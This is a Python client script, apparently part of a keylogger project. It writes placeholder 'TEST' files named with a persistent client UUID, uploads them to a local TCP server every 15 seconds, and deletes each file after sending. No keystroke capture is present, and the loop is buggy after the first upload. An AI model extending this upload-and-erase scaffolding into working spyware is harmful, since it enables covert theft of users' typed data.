import os
import socket
import uuid
import configparser
import time
import platform

# Server configuration
SERVER_HOST = '127.0.0.2'  # Change this to the server's IP address
SERVER_PORT = 12345
BUFFER_SIZE = 1024
CLIENT_CONFIG_FILE = "client_config.ini"
IP_CLIENT = None
BUFFER_SIZE = 1024
COUNT = 1

#array with created keylogger file still existing
FILE = []

configFile = configparser.ConfigParser()



def get_os():
    return platform.system()


def getIP():
    pass



def writeFile():
    global COUNT
    global FILE
    nameFile = f"{getID()}_{COUNT}.txt"
    try:
        with open(nameFile, "wb") as f:
            COUNT += 1
            FILE.append(nameFile)
            f.write(b"TEST")
    except Exception as e:
        print(f"An error occurred during writing file: {e}")

def deleteFile(nameFile):
    global FILE
    print("A file is going to be deleted..")
    try:
        os.remove(nameFile)
        FILE.pop(0)
        print(f"File '{nameFile}' has been deleted successfully\n")
    except FileNotFoundError:
        print(f"File '{nameFile}' has not been found")
    except Exception as e:
        print(f"An error occurred while deleting the file: {e}")


def setID():
    clientID = str(uuid.uuid4())
    configFile['Client'] = {'ID': clientID}
    try:
        with open(CLIENT_CONFIG_FILE, 'w') as file:
            configFile.write(file)
    except IOError as e:
        print(f"An error occurred while writing: {e}")
    except Exception as e:
        print(f"An error occurred setting ID: {e}")
    print(f"[*] Assigned ID: {clientID}")
    return clientID


def getID():
    try:
        configFile.read(CLIENT_CONFIG_FILE)
        return configFile.get("Client", "ID")
    except (configparser.NoSectionError, configparser.NoOptionError, FileNotFoundError):
        return setID()


def sendFile(socket):
    global FILE
    print("A file is going to be sent to the server..")
    try:
        nameFile = FILE[0]
        with open(nameFile, 'rb') as f:
            fileToSent = f.read()
        socket.sendall(f"{nameFile}\n".encode() + fileToSent)
        print(f"The file '{nameFile}' has been sent to the server\n") 
        return nameFile    
    except Exception as e:
        print(f"An error occurred while sending file: {e}")



def connectionServer():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((SERVER_HOST, SERVER_PORT))
            print("Client connected successfully to Server!\n")

            id = getID().encode()
            s.sendall(id)
            data = s.recv(BUFFER_SIZE)
            print(f"Response from the SERVER : '{data.decode()}'\n")

            while True:
                nameFile = sendFile(s)
                data = s.recv(BUFFER_SIZE)
                print(f"Response from the SERVER : '{data.decode()}'\n")
                deleteFile(nameFile)

                print("Wait 15 seconds before sending new file to server\n")
                time.sleep(15)
        except ConnectionRefusedError:
            print("Server not available. Retrying in 5 seconds..")
            time.sleep(5)
        except Exception as e:
            print(f"An error occurred while connected to server: {e}")
        
        

def main():
    writeFile()
    connectionServer()
    
    os_name = get_os()
    print(f"Système d'exploitation : {os_name}")

    #Close the connection
    #client_socket.close()

if __name__ == "__main__":
    main()
